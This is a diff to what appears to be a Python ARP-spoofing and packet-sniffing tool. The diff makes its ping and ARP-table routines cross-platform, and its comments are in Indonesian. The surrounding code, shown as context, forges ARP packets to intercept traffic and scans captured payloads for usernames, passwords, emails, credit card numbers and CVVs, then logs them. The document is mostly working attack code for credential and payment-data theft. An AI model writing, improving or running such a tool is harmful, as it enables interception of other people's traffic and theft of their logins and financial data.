@@ -3,6 +3,7 @@ import sys
 import threading
 import netifaces
 import time
+import platform  # Untuk mendeteksi OS
 from colorama import init, Fore, Style
 import re
 import subprocess
@@ -45,11 +46,18 @@ def list_scapy_interfaces():
         print(Fore.YELLOW + f"{idx + 1}. {interface} - {ip_address}")
     return interface_info
 
-# Ping IP to verify connection
+# Ping IP to verify connection (cross-platform)
 def ping_ip(ip):
+    system_platform = platform.system()
     try:
-        output = subprocess.check_output(["ping", "-n", "1", "-w", "1000", ip], stderr=subprocess.DEVNULL).decode()
-        return "TTL=" in output
+        if system_platform == "Windows":
+            # Perintah untuk Windows
+            output = subprocess.check_output(["ping", "-n", "1", "-w", "1000", ip], stderr=subprocess.DEVNULL).decode()
+        else:
+            # Perintah untuk Linux/MacOS
+            output = subprocess.check_output(["ping", "-c", "1", "-W", "1", ip], stderr=subprocess.DEVNULL).decode()
+        
+        return "TTL=" in output or "ttl=" in output  # TTL case sensitivity
     except subprocess.CalledProcessError:
         return False
 
@@ -73,9 +81,22 @@ def network_scanner(ip_range, local_subnet):
 
     if not active_devices:
         print(Fore.YELLOW + "[!] No active devices detected via ARP. Checking ARP table...")
-        arp_table = subprocess.check_output("arp -a", shell=True).decode()
+
+        # Deteksi OS dan sesuaikan perintah ARP
+        system_platform = platform.system()
+        if system_platform == "Windows":
+            arp_command = "arp -a"
+        else:
+            arp_command = "ip neigh"
+
+        arp_table = subprocess.check_output(arp_command, shell=True).decode()
+
         for line in arp_table.splitlines():
-            match = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+([a-fA-F0-9:-]{17})', line)
+            if system_platform == "Windows":
+                match = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+([a-fA-F0-9:-]{17})', line)
+            else:
+                match = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+.*lladdr\s+([a-fA-F0-9:]{17})', line)
+
             if match:
                 ip, mac = match.groups()
                 if ip.startswith(local_subnet) and ping_ip(ip):
@@ -100,12 +121,9 @@ def restore_arp(target_ip, target_mac, source_ip, source_mac, interface):
     restore_packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
     sendp(restore_packet, count=4, verbose=False, iface=interface)
 
-
 # Packet Sniffer
 def packet_sniffer(interface):
-    # Filter hanya untuk HTTP, HTTPS, dan TCP yang umum
     packet_filter = "tcp port 80 or tcp port 443 or tcp"
-
     try:
         sniff(iface=interface, prn=process_packet, store=False, filter=packet_filter)
     except Exception as e:
@@ -115,7 +133,6 @@ def packet_sniffer(interface):
 def process_packet(packet):
     if packet.haslayer(Raw):
         try:
-            # Mengabaikan karakter yang tidak bisa didekode
             payload = packet[Raw].load.decode('utf-8', errors='ignore')
             if re.search(r'(?i)(username|user|userid|password|pass|pwd|login|email|creditcard|card number|cvv|payment)', payload):
                 log_sensitive_data(packet, payload)
